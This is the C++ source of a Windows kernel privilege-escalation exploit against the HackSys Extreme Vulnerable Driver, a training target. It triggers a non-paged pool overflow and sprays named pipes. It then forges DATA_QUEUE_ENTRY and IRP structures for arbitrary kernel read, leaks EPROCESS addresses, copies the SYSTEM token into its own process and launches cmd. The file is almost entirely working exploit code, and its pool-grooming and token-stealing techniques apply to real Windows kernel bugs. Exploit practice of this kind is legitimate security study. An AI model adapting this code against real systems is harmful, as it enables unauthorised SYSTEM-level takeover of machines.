// NonPagedPoolOverflow.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include "hevd.hpp"
#include "Hexdump.hpp"
#include "Header.hpp"
#include <iostream>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")


#define NAME_PIPE_SPRAY_COUNT 1000
#define NAME_PIPE_HOLE_COUNT 1
#define NAME_PIPE_DUMMY_COUNT 4
#define OFFSET_QUEUE_IN_CCB 0xa8    // After fixing, this should be equal to: offsetof(NP_CCB, DataQueueOutbound)
//#define NAME_PIPE_PAD_COUNT 32

// The requested alloc size is patched to be 0x1d0 ==> real block size with POOL_HEADER is 0x1e0
// Block size 0x200 is not handled by the kLFH for some reason (??)
#define VULN_CHUNK_SIZE 0x1d0
#define NAME_PIPE_BUF_SIZE (VULN_CHUNK_SIZE - sizeof(DATA_QUEUE_ENTRY))  // Calculated based on the expected pool block size

HANDLE g_hVulnReadPipe = NULL, g_hVulnWritePipe = NULL;

HANDLE openDevice() {
    return CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
}

void closeDevice(HANDLE device) {
    CloseHandle(device);
}

PVOID leakKernelObjectAddr(HANDLE handle, DWORD pid) {
    NTSTATUS status;
    SYSTEM_HANDLE_INFORMATION localHandleInfoObj;
    PSYSTEM_HANDLE_INFORMATION handleInfo;
    ULONG handleInfoSize;
    PVOID result = NULL;
    status = NtQuerySystemInformation(SystemHandleInformation, &localHandleInfoObj, sizeof(localHandleInfoObj), &handleInfoSize);
    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        printf("Can't get handle table size. Error: %llx\n", status);
        return NULL;
    }
    handleInfoSize += 100 * sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO);	// add a bit as extra
    handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize);
    status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL);
    if (status != STATUS_SUCCESS) {
        printf("Can't query handle table. Error: %llx\n", status);
        HeapFree(GetProcessHeap(), 0, handleInfo);
        return NULL;
    }

    for (int i = 0; i < handleInfo->NumberOfHandles; i++)
    {
        // Check if this is the correct handle
        if ((handleInfo->Handles[i].UniqueProcessId == pid) &&
            ((HANDLE)handleInfo->Handles[i].HandleValue == handle))
        {
            //printf("[*] Found object address: 0x%p\n", handleInfo->Handles[i].Object);
            //printf("%hhd\n", handleInfo->Handles[i].ObjectTypeIndex);
            result = handleInfo->Handles[i].Object;
            break;
        }
    }
    HeapFree(GetProcessHeap(), 0, handleInfo);
    return result;
}

DATA_QUEUE_ENTRY* initFakeDataQueueEntry() {
    // Init 2 entry linked to each other
    // The 1st entry will be used for arbitrary read and token rewrite
    // The 2nd entry will be used for fixing the Flink and Blink of the corrupted DATA_QUEUE_ENTRY

    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)VirtualAlloc(NULL, sizeof(DATA_QUEUE_ENTRY), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    IRP* irp = (IRP*)VirtualAlloc(NULL, sizeof(IRP), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    printf("[*] Fake DATA_QUEUE_ENTRY at: 0x%p\n", dqe);
    printf("[*] Usermode IRP at: 0x%p\n", irp);
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->Irp = irp;
    dqe->SecurityContext = 0;
    dqe->EntryType = 1;
    dqe->QuotaInEntry = 0;
    dqe->DataSize = 0x100;  // will be fixed later when arbitrary read

    //DATA_QUEUE_ENTRY* dqe2 = (DATA_QUEUE_ENTRY*)VirtualAlloc(NULL, sizeof(DATA_QUEUE_ENTRY), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    //IRP* irp2 = (IRP*)VirtualAlloc(NULL, sizeof(IRP), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    //memset(dqe2, 0, sizeof(DATA_QUEUE_ENTRY));
    //dqe2->Irp = irp;
    //dqe2->Blink = (uint64_t)dqe;
    //dqe->Flink = (uint64_t)dqe2;
    return dqe;
}

void cleanFakeEntry(DATA_QUEUE_ENTRY* dqe) {
    if (dqe) {
        if (dqe->Irp) VirtualFree(dqe->Irp, 0, MEM_RELEASE | MEM_DECOMMIT);
        VirtualFree(dqe, 0, MEM_RELEASE | MEM_DECOMMIT);
        if (dqe->Flink) {
            DATA_QUEUE_ENTRY* dqe2 = (DATA_QUEUE_ENTRY*)dqe->Flink;
            if (dqe2->Irp) VirtualFree(dqe2->Irp, 0, MEM_RELEASE | MEM_DECOMMIT);
            VirtualFree(dqe2, 0, MEM_RELEASE | MEM_DECOMMIT);
        }
    }
}

void arbitraryRead(DATA_QUEUE_ENTRY* usermodeDqe, PVOID addr, size_t size, PVOID result) {
    //printf("[*] Reading: 0x%p\n", addr);
    usermodeDqe->Irp->AssociatedIrp.SystemBuffer = addr;
    usermodeDqe->SecurityContext = 0;
    usermodeDqe->EntryType = 1;
    usermodeDqe->QuotaInEntry = 0;
    usermodeDqe->DataSize = size;
    size_t bufSize = NAME_PIPE_BUF_SIZE + sizeof(_POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY) + size;
    char *tempBuf = (char*)VirtualAlloc(NULL, bufSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    
    PeekNamedPipe(g_hVulnReadPipe, tempBuf, bufSize, NULL, NULL, NULL);
    memcpy(result, &tempBuf[NAME_PIPE_BUF_SIZE + sizeof(_POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY)], size);
    //std::cout << Hexdump(result, size) << std::endl;
    VirtualFree(tempBuf, 0, MEM_RELEASE | MEM_DECOMMIT);
}

PNP_CCB findCorruptCCB(DATA_QUEUE_ENTRY* usermodeDqe, PNP_CCB ccbEntry, DATA_QUEUE_ENTRY* corruptDqe) {
    // Find the CCB corresponding to the corrupt DQE, must know 1 CCB of an instance from the same pipe name
    PNP_CCB trav = ccbEntry;
    LIST_ENTRY listEntry;
    PNP_DATA_QUEUE currentQueueAddr;
    DATA_QUEUE_ENTRY* currentEntryAddr;
    while (true) {
        currentQueueAddr = (PNP_DATA_QUEUE)((char*)trav + offsetof(NP_CCB, DataQueueOutbound));
        arbitraryRead(usermodeDqe, currentQueueAddr, 8, &currentEntryAddr);
        //arbitraryRead(usermodeDqe, (char*)currentQueueAddr + offsetof(NP_DATA_QUEUE, Queue.Flink), 8, &currentEntryAddr);
        //printf("Current queue: 0x%p - Current entry: 0x%p\n", currentQueueAddr, currentEntryAddr);
        if (currentEntryAddr == corruptDqe) {
            return trav;
        }
        PNP_CCB nextCcb;
        arbitraryRead(usermodeDqe, (char*)trav + offsetof(NP_CCB, CcbEntry), 8, &nextCcb);
        nextCcb = (PNP_CCB)((int64_t)nextCcb - offsetof(NP_CCB, CcbEntry));
        //printf("Next ccb: 0x%p\n", nextCcb);
        if (nextCcb == ccbEntry) {
            // we loop all entry in the list
            puts("[!] Can't find the required CCB");
            return NULL;
        }
        trav = nextCcb;
        //getchar();
    }
}

PVOID findIRP(DATA_QUEUE_ENTRY* usermodeDqe, PNP_CCB ccbEntry, PVOID blacklistIrp[] = NULL, uint64_t blacklistSize = 0) {
    // Find the CCB corresponding to the corrupt DQE, must know 1 CCB of an instance from the same pipe name
    PNP_CCB trav = ccbEntry;
    LIST_ENTRY listEntry;
    PNP_DATA_QUEUE currentQueueAddr;
    DATA_QUEUE_ENTRY* currentEntryAddr;
    DATA_QUEUE_ENTRY currentEntryContent;
    bool foundIrp;
    while (true) {
        currentQueueAddr = (PNP_DATA_QUEUE)((char*)trav + offsetof(NP_CCB, DataQueueOutbound));
        arbitraryRead(usermodeDqe, currentQueueAddr, 8, &currentEntryAddr);
        //arbitraryRead(usermodeDqe, (char*)currentQueueAddr + offsetof(NP_DATA_QUEUE, Queue.Flink), 8, &currentEntryAddr);
        //printf("Current queue: 0x%p - Current entry: 0x%p\n", currentQueueAddr, currentEntryAddr);
        memset(&currentEntryContent, 0, sizeof(DATA_QUEUE_ENTRY));
        arbitraryRead(usermodeDqe, currentEntryAddr, sizeof(DATA_QUEUE_ENTRY), &currentEntryContent);
        if (currentEntryContent.EntryType == 1 && currentEntryContent.Irp != 0) {
            foundIrp = true;
            if (blacklistIrp != NULL) {
                for (int i = 0; i < blacklistSize; i++) {
                    if (blacklistIrp[i] == currentEntryContent.Irp) {
                        foundIrp = false;
                        break;
                    }
                }
            }
            if (foundIrp) return currentEntryContent.Irp;
        }
        PNP_CCB nextCcb;
        arbitraryRead(usermodeDqe, (char*)trav + offsetof(NP_CCB, CcbEntry), 8, &nextCcb);
        nextCcb = (PNP_CCB)((int64_t)nextCcb - offsetof(NP_CCB, CcbEntry));
        //printf("Next ccb: 0x%p\n", nextCcb);
        if (nextCcb == ccbEntry) {
            // we loop all entry in the list
            puts("[!] Can't find the required CCB");
            return NULL;
        }
        trav = nextCcb;
        //getchar();
    }
}

void prepareWriteIRP(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address) {
    irp->Flags = 0x60850;
    irp->AssociatedIrp.SystemBuffer = source_address;
    irp->UserBuffer = destination_address;
    irp->ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);
    irp->ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);
}

void prepareDataEntryForWrite(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint32_t size) {
    //memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    //dqe->Flink = (uint64_t)dqe;
    dqe->EntryType = 0;
    dqe->DataSize = size;
    dqe->QuotaInEntry = size - 1;
    dqe->Irp = irp;
}


int main()
{
    //HANDLE hDevice = NULL, hPipe1 = NULL, hPipeClient1 = NULL, hPipe2 = NULL, hPipeClient2 = NULL;
    HANDLE hDevice = NULL;
    HANDLE hReadPipeList[NAME_PIPE_SPRAY_COUNT] = {}, hWritePipeList[NAME_PIPE_SPRAY_COUNT] = {};
    HANDLE hReadHolePipeList[NAME_PIPE_HOLE_COUNT] = {}, hWriteHolePipeList[NAME_PIPE_HOLE_COUNT] = {};
    HANDLE hReadDummyPipe[NAME_PIPE_DUMMY_COUNT] = {}, hWriteDummyPipe[NAME_PIPE_DUMMY_COUNT] = {};
    int holePipeCounter;

    int corruptPipeIndex;
    QWORD nextChunkDataQueueAddr = 0;
    PNP_CCB nextChunkCcbAddr = 0, corruptCcbAddr = 0;
    DATA_QUEUE_ENTRY* nextChunkAddr = 0;
    DATA_QUEUE_ENTRY* corruptedEntryAddr = 0;
    DATA_QUEUE_ENTRY* usermodeDqe = NULL;

    HANDLE hCurrentProcess;
    PVOID currentEprocess, systemEprocess;

    IO_STATUS_BLOCK isb;
    PVOID irpAddr;
    IRP leakedIrp;
    IRP fakeIrp1, fakeIrp2;
    PVOID unbufferIrp1, unbufferIrp2;
    PVOID fakeIrpSystemAddr1, fakeIrpSystemAddr2;
    PVOID blackListIrp[3];  // filter out used IRP
    uint64_t irpThreadList1[2], irpThreadList2[2];

    LIST_ENTRY fixDqeListEntry;
    PVOID fixDqeListEntrySystemIrp, fixDqeListEntrySystemAddr;

    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");

    hDevice = openDevice();
    if (hDevice == INVALID_HANDLE_VALUE) {
        puts("Failed to open");
        goto EXIT;
    }

    // Spray the heap with DATA_QUEUE_ENTRY
    // Quota has to be big enough for spraying
    for (int i = 0; i < NAME_PIPE_SPRAY_COUNT; i++) {
        hWritePipeList[i] = CreateNamedPipeA(PIPE_NAME_1, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, NAME_PIPE_BUF_SIZE, NULL, 0, NULL);
        hReadPipeList[i] = CreateFileA(PIPE_NAME_1, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
        if (hWritePipeList[i] == NULL || hReadPipeList[i] == NULL) {
            puts("Failed to create pipe");
            goto EXIT;
        }
    }

    for (int i = 0; i < NAME_PIPE_HOLE_COUNT; i++) {
        hWriteHolePipeList[i] = CreateNamedPipeA(PIPE_NAME_1, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, NAME_PIPE_BUF_SIZE, NULL, 0, NULL);
        hReadHolePipeList[i] = CreateFileA(PIPE_NAME_1, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
        if (hWriteHolePipeList[i] == NULL || hReadHolePipeList[i] == NULL) {
            puts("Failed to create pipe");
            goto EXIT;
        }
    }
    for (int i = 0; i < NAME_PIPE_DUMMY_COUNT; i++) {
        hWriteDummyPipe[i] = CreateNamedPipeA(PIPE_NAME_1, PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, NAME_PIPE_BUF_SIZE, NULL, 0, NULL);
        hReadDummyPipe[i] = CreateFileA(PIPE_NAME_1, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
        if (hWriteDummyPipe == NULL || hReadDummyPipe == NULL) {
            puts("Failed to create pipe");
            goto EXIT;
        }
    }


    puts("[*] Start spraying");
    char sprayContent[NAME_PIPE_BUF_SIZE];
    memset(sprayContent, 0x41, sizeof(sprayContent));
    holePipeCounter = 0;
    // Fill the pool with DATA_QUEUE_ENTRY, putting the entry of the "hole" pipe so we can remove it later
    for (int i = 0; i < NAME_PIPE_SPRAY_COUNT; i++) {
        WriteFile(hWritePipeList[i], sprayContent, sizeof(sprayContent), NULL, NULL);
        // 900 is a random threshold, the original repo chose it too
        // These checks are to make sure the holes are in relative middle of the sprayed pages (so as to not end up in a non-filled page)
        // The i % 4 check makes sure the holes has low chance to be next to each other (??)
        if (i > 900 && i < NAME_PIPE_SPRAY_COUNT - 10 && i % 8 == 2 && holePipeCounter < NAME_PIPE_HOLE_COUNT) {
            //printf("%d\n", i);
            WriteFile(hWriteHolePipeList[holePipeCounter], sprayContent, sizeof(sprayContent), NULL, NULL);
            holePipeCounter++;
        }
    }
    // Make holes in the spray by reading the "hole" pipes
    char tmp[NAME_PIPE_BUF_SIZE];
    for (int i = 0; i < NAME_PIPE_HOLE_COUNT; i++) {
        ReadFile(hReadHolePipeList[i], tmp, NAME_PIPE_BUF_SIZE, NULL, NULL);
    }
    puts("[*] Spraying finished");

    // Find the vulnerable pipe in the 2nd list
    usermodeDqe = initFakeDataQueueEntry();
    char overflow[VULN_CHUNK_SIZE + sizeof(_POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY)];
    LIST_ENTRY fakeListEntry;
    fakeListEntry.Flink = &fakeListEntry;
    fakeListEntry.Blink = &fakeListEntry;

    memset(overflow, 0, sizeof(overflow));
    // Construct fake POOL_HEADER
    ((_POOL_HEADER*)&overflow[VULN_CHUNK_SIZE])->PreviousSize = 0;
    ((_POOL_HEADER*)&overflow[VULN_CHUNK_SIZE])->PoolIndex = 0;
    ((_POOL_HEADER*)&overflow[VULN_CHUNK_SIZE])->BlockSize = 0x1e;
    ((_POOL_HEADER*)&overflow[VULN_CHUNK_SIZE])->PoolType = 0xa;
    ((_POOL_HEADER*)&overflow[VULN_CHUNK_SIZE])->PoolTag = 0x7246704e;
    ((_POOL_HEADER*)&overflow[VULN_CHUNK_SIZE])->ProcessBilled = 0;

    // The next entry in the link list of the corrupted one is our usermode entry
    ((DATA_QUEUE_ENTRY*)&overflow[VULN_CHUNK_SIZE + sizeof(_POOL_HEADER)])->Flink = (uint64_t)usermodeDqe;
    ((DATA_QUEUE_ENTRY*)&overflow[VULN_CHUNK_SIZE + sizeof(_POOL_HEADER)])->Blink = (uint64_t)usermodeDqe;
    // Since IRP is invalid, EntryType has to be set to 0 so that the kernel won't crash when we call PeekNamedPipe
    ((DATA_QUEUE_ENTRY*)&overflow[VULN_CHUNK_SIZE + sizeof(_POOL_HEADER)])->EntryType = 0;  
    // Overwrite DataSize so we can find the corrupted pipe by PeekNamedPipe
    // If successful, we will also get the Header of the next DATA_QUEUE_ENTRY (if we have the layout: Hack | NpFr | NpFr) 
    ((DATA_QUEUE_ENTRY*)&overflow[VULN_CHUNK_SIZE + sizeof(_POOL_HEADER)])->DataSize = NAME_PIPE_BUF_SIZE + sizeof(_POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY); 
    ((DATA_QUEUE_ENTRY*)&overflow[VULN_CHUNK_SIZE + sizeof(_POOL_HEADER)])->QuotaInEntry = NAME_PIPE_BUF_SIZE;
    DeviceIoControl(hDevice, HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX, overflow, sizeof(overflow), NULL, NULL, NULL, NULL);
    char outOfBoundDat[NAME_PIPE_BUF_SIZE + sizeof(_POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY)];
    LIST_ENTRY nextChunkEntry;
    for (int i = 0; i < NAME_PIPE_SPRAY_COUNT; i++) {
        DWORD byteRead;
        PeekNamedPipe(hReadPipeList[i], outOfBoundDat, sizeof(outOfBoundDat), &byteRead, 0, NULL);
        // Only the corrupt entry can read out of bound
        //printf("%d: %d\n", i, byteRead);
        if (byteRead == sizeof(outOfBoundDat)) {
            //printf("[!] Found: %d\n", i);
            // Only 1 hole so high chance that the next allocations inside arbitraryRead() also in the same place and corrupt the same pipe
            // My mistake, we can never guarentee it, cause there are too many other allocations happening in the kernel
            // But the method only requires 1 pipe anyway
            g_hVulnReadPipe = hReadPipeList[i];
            g_hVulnWritePipe = hWritePipeList[i];
            std::cout << Hexdump(outOfBoundDat, sizeof(outOfBoundDat)) << std::endl;
            corruptPipeIndex = i;

            if (((_POOL_HEADER*)(&outOfBoundDat[NAME_PIPE_BUF_SIZE]))->PoolTag != 0x7246704E) {
                puts("[*] Wrong layout. BSOD incoming");
                goto EXIT;
            }

            break;
        }
    }
    if (!g_hVulnReadPipe) {
        puts("[!] Can't find overflown entry");
        goto EXIT;
    }
    nextChunkDataQueueAddr = ((DATA_QUEUE_ENTRY*)(&outOfBoundDat[NAME_PIPE_BUF_SIZE + sizeof(_POOL_HEADER)]))->Flink;
    printf("[*] Next chunk DATA_QUEUE address: 0x%llx\n", nextChunkDataQueueAddr);
    // Read the Flink field of CCB, since there's only 1 DQE, the list head will point to the only entry
    arbitraryRead(usermodeDqe, (PVOID)nextChunkDataQueueAddr, 8, &nextChunkAddr); 
    corruptedEntryAddr = (DATA_QUEUE_ENTRY*)((uint64_t)nextChunkAddr - sizeof(_POOL_HEADER) - VULN_CHUNK_SIZE);
    printf("[*] Leaked corrupted entry address: 0x%p\n", corruptedEntryAddr);

    // Leak CCB of corrupt entry
    nextChunkCcbAddr = (PNP_CCB)(nextChunkDataQueueAddr - offsetof(NP_CCB, DataQueueOutbound));    // Offset of the field DataQueu of _NP_CCB struct in header.hpp is incorrect, hardcode for now
    printf("[*] Next chunk CCB address: %p\n", nextChunkCcbAddr);
    corruptCcbAddr = findCorruptCCB(usermodeDqe, nextChunkCcbAddr, corruptedEntryAddr);
    printf("[*] Corrupt chunk CCB address: %p\n", corruptCcbAddr);

    // LEAK EPROCESS
    hCurrentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    currentEprocess = leakKernelObjectAddr(hCurrentProcess, GetCurrentProcessId());
    printf("[*] Current _EPROCESS: 0x%p\n", currentEprocess);
    systemEprocess = leakKernelObjectAddr((HANDLE)4, 4);
    printf("[*] System _EPROCESS: 0x%p\n", systemEprocess);

    // Creating a non buffered entry and leak IRP
    memset(sprayContent, 0x42, sizeof(sprayContent));
    NtFsControlFile(hWriteDummyPipe[0], 0, 0, 0, &isb, 0x119FF8, sprayContent, NAME_PIPE_BUF_SIZE, 0, 0);
    irpAddr = findIRP(usermodeDqe, nextChunkCcbAddr);
    printf("[*] Leaked IRP addr: 0x%p\n", irpAddr);
    //puts("[*] Leaked IRP");
    //std::cout << Hexdump(&irpData, sizeof(IRP)) << std::endl;
    arbitraryRead(usermodeDqe, irpAddr, sizeof(IRP), &leakedIrp);

    // Send the fixed list entry to kernel space, because the io completion doesn't happen in our exploit binary's context.
    //fixDqeListEntry.Flink = (LIST_ENTRY*)((uint64_t)corruptCcbAddr + offsetof(NP_CCB, DataQueueOutbound));
    //fixDqeListEntry.Blink = (LIST_ENTRY*)((uint64_t)corruptCcbAddr + offsetof(NP_CCB, DataQueueOutbound));
    //NtFsControlFile(hWriteDummyPipe[3], 0, 0, 0, &isb, 0x119FF8, &fixDqeListEntry, sizeof(LIST_ENTRY), 0, 0);
    //blackListIrp[0] = irpAddr;
    //fixDqeListEntrySystemIrp = findIRP(usermodeDqe, nextChunkCcbAddr, blackListIrp, 1);
    //arbitraryRead(usermodeDqe, (char*)fixDqeListEntrySystemIrp + offsetof(IRP, AssociatedIrp.SystemBuffer), 8, &fixDqeListEntrySystemAddr);
    //printf("[*] Correct list entry in kernel space at: 0x%p\n", fixDqeListEntrySystemAddr);

    // Crafting 1st fake IRP, move the content to kernel space and leak the address
    memcpy(&fakeIrp1, &leakedIrp, sizeof(IRP));
    prepareWriteIRP(&fakeIrp1, irpThreadList1, (char*)systemEprocess + TOKEN_OFFSET, (char*)currentEprocess + TOKEN_OFFSET);
    NtFsControlFile(hWriteDummyPipe[1], 0, 0, 0, &isb, 0x119FF8, &fakeIrp1, sizeof(IRP), 0, 0);
    blackListIrp[0] = irpAddr;
    //blackListIrp[1] = fixDqeListEntrySystemIrp;
    unbufferIrp1 = findIRP(usermodeDqe, nextChunkCcbAddr, blackListIrp, 1);
    arbitraryRead(usermodeDqe, (char*)unbufferIrp1 + offsetof(IRP, AssociatedIrp.SystemBuffer), 8, &fakeIrpSystemAddr1);
    printf("[*] Fake IRP in kernel space at: 0x%p\n", fakeIrpSystemAddr1);

    // Similar to the 2nd irp
    //memcpy(&fakeIrp2, &leakedIrp, sizeof(IRP));
    //prepareWriteIRP(&fakeIrp2, irpThreadList2, fixDqeListEntrySystemAddr, corruptedEntryAddr);
    //NtFsControlFile(hWriteDummyPipe[2], 0, 0, 0, &isb, 0x119FF8, &fakeIrp2, sizeof(IRP), 0, 0);
    //blackListIrp[0] = irpAddr;
    //blackListIrp[1] = fixDqeListEntrySystemIrp;
    //blackListIrp[2] = unbufferIrp1;
    //unbufferIrp2 = findIRP(usermodeDqe, nextChunkCcbAddr, blackListIrp, 3);
    //arbitraryRead(usermodeDqe, (char*)unbufferIrp2 + offsetof(IRP, AssociatedIrp.SystemBuffer), 8, &fakeIrpSystemAddr2);
    //printf("[*] 2nd fake IRP in kernel space at: 0x%p\n", fakeIrpSystemAddr2);

    irpThreadList1[0] = irpThreadList1[1] = (uint64_t)fakeIrpSystemAddr1 + offsetof(IRP, ThreadListEntry.Flink);
    //irpThreadList2[0] = irpThreadList2[1] = (uint64_t)fakeIrpSystemAddr2 + offsetof(IRP, ThreadListEntry.Flink);
    prepareDataEntryForWrite(usermodeDqe, (IRP*)fakeIrpSystemAddr1, 8);
    //prepareDataEntryForWrite((DATA_QUEUE_ENTRY*)usermodeDqe->Flink, (IRP*)fakeIrpSystemAddr2, 16);

    // The read size has to be just right so that the stalled write completion routine won't follow the corrupted link list entries
    ReadFile(g_hVulnReadPipe, tmp, 1, NULL, 0);
    puts("[*] Done");
    system("cmd");
    Sleep(10000);


EXIT:
    getchar();
    if (hDevice) closeDevice(hDevice);

    for (int i = 0; i < NAME_PIPE_SPRAY_COUNT; i++) {
        if (hWritePipeList[i] != NULL) CloseHandle(hWritePipeList[i]);
        if (hReadPipeList[i] != NULL) CloseHandle(hReadPipeList[i]);
    }

    for (int i = 0; i < NAME_PIPE_HOLE_COUNT; i++) {
        if (hWriteHolePipeList[i] != NULL) CloseHandle(hWriteHolePipeList[i]);
        if (hReadHolePipeList[i] != NULL) CloseHandle(hReadHolePipeList[i]);
    }
    for (int i = 0; i < NAME_PIPE_DUMMY_COUNT; i++) {
        if (hWriteDummyPipe[i] != NULL) CloseHandle(hWriteDummyPipe[i]);
        if (hReadDummyPipe[i] != NULL) CloseHandle(hReadDummyPipe[i]);
    }

    cleanFakeEntry(usermodeDqe);
}
